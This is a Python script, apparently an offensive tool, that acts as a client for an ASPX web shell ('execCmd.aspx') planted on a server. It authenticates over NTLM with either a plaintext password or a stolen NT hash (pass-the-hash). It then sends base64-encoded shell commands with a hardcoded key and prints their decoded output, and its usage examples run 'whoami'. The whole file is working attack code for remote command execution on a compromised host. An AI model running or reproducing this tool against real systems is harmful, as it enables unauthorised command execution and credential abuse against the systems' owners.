import sys
import base64
import re
import binascii
import ssl
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
from impacket import ntlm

def aspxCmdNTLM(host, port, url, mode, domain, user, data, command):
    key = "UGFzc3dvcmQxMjM0NTY3ODk"    
    command = command.encode("utf-8")
    # base64 encode
    enpayload = base64.b64encode(command).decode('utf8')
    POST_BODY = "data1={key}&data2={payload}"
    POST_BODY = POST_BODY.format(key=key,payload=enpayload)
    if port ==443:
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            session = HTTPSConnection(host, port, context=uv_context)
        except AttributeError:
            session = HTTPSConnection(host, port)
    else:        
        session = HTTPConnection(host, port)

    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(host, domain)

    # Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    headers = {
        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
        "Content-type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request(method="POST",url=url,body=POST_BODY,headers=headers)

    res = session.getresponse()
    res.read()

    if res.status != 401:
        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
        return False
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        print('No authentication requested by the server for url %s'%(url))
        return False

    print('[*] Got 401, performing NTLM authentication')
    # Get negotiate data
    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        print('No NTLM challenge returned from server')
        return False
    
    if mode =='plaintext':
        password1 = data;
        nt_hash = ''

    elif mode =='ntlmhash':
        password1 = ''
        nt_hash = binascii.unhexlify(data)

    else:
        print('[!] Wrong parameter')
        return False

    lm_hash = ''    
    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, domain, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())

    headers = {
        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
        "Content-type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request(method="POST",url=url,body=POST_BODY,headers=headers)
    res = session.getresponse()
    body = res.read()    
    session.close()

    if res.status == 401:
        print('[!] Server returned HTTP status 401 - authentication failed')
        return False
    else:
        if res.status == 200:  
            print('[+] Valid')
            print('[+] Result:')
            # base64 decode
            print(base64.b64decode(body.decode('utf8')).decode('utf8'))
        return True

if __name__ == '__main__':
    if len(sys.argv)!=9:
        print('[!]Wrong parameter')
        print('aspxCmdNTLM')        
        print('Use to implement NTLM authentication and communicate with execCmd.aspx')
        print('Communication data is encoded with Base64')        
        print('Usage:')
        print('%s <host> <port> <url> <mode> <domain> <user> <password> <command>'%(sys.argv[0]))
        print('<mode>:')
        print('- plaintext')   
        print('- ntlmhash')
        print('Eg.')
        print('%s 192.168.1.1 443 https://192.168.1.1/1.txt plaintext test.com user1 password1 whoami'%(sys.argv[0]))
        print('%s test.com 80 http://192.168.1.1/1.aspx ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1 whoami'%(sys.argv[0]))
        sys.exit(0)
    else:
        aspxCmdNTLM(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7], sys.argv[8])




